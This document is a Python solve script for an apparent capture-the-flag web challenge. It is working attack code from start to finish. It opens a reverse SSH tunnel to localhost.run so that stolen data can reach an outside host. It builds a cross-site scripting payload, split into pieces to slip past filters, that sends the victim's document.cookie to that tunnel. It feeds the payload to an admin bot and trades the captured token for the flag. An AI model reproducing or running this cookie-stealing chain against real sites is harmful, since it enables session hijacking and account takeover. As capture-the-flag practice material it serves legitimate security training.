from __future__ import annotations

import json
import os
import queue
import re
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlsplit
from urllib.request import Request, urlopen


ROOT = Path(__file__).resolve().parent
TOKEN_RE = re.compile(r"TOKEN_[0-9a-f]{16}")
TUNNEL_RE = re.compile(r"https://[a-z0-9]+\.lhr\.life")


def load_endpoints() -> tuple[str, str]:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoints = {entry["name"]: entry["url"].rstrip("/") for entry in data["endpoints"]}
    return endpoints["web"], endpoints["bot"]


def post_json(url: str, body: dict[str, str], timeout: float) -> bytes:
    request = Request(
        url,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urlopen(request, timeout=timeout) as response:
        return response.read()


def run() -> str:
    _, bot_url = load_endpoints()
    token_queue: queue.Queue[str] = queue.Queue(maxsize=1)

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            match = TOKEN_RE.search(urlsplit(self.path).query)
            if match and token_queue.empty():
                token_queue.put(match.group(0))
            self.send_response(204)
            self.end_headers()

        def log_message(self, format: str, *args: object) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    port = server.server_address[1]

    creationflags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
    tunnel = subprocess.Popen(
        [
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "ServerAliveInterval=30",
            "-R",
            f"80:127.0.0.1:{port}",
            "nokey@localhost.run",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="replace",
        creationflags=creationflags,
    )

    try:
        deadline = time.monotonic() + 20
        tunnel_url = None
        assert tunnel.stdout is not None
        while time.monotonic() < deadline:
            line = tunnel.stdout.readline()
            if not line and tunnel.poll() is not None:
                break
            match = TUNNEL_RE.search(line)
            if match:
                tunnel_url = match.group(0)
                break
        if tunnel_url is None:
            raise RuntimeError("public tunnel URL was not allocated")

        script = (
            "<script>location='h'+'ttps:'+'/'+'/"
            + tunnel_url.removeprefix("https://")
            + "/leak?token='+document.cookie</script>"
        )
        visit_url = "http://127.0.0.1:9000/?content=" + quote(script, safe="")
        post_json(bot_url + "/api/report", {"url": visit_url}, 35)
        token = token_queue.get(timeout=10)
        flag = post_json(bot_url + "/api/verify", {"token": token}, 10).decode()
        if not re.fullmatch(r"pwnsec\{.+\}", flag):
            raise RuntimeError("verification response was not a flag")
        return flag
    finally:
        server.shutdown()
        server.server_close()
        tunnel.terminate()
        try:
            tunnel.wait(timeout=3)
        except subprocess.TimeoutExpired:
            tunnel.kill()
            tunnel.wait(timeout=3)


if __name__ == "__main__":
    try:
        sys.stdout.buffer.write(run().encode("utf-8"))
    except (HTTPError, URLError, OSError, RuntimeError, queue.Empty, KeyError, ValueError) as exc:
        sys.stderr.write(f"solve failed: {exc}\n")
        raise SystemExit(1)
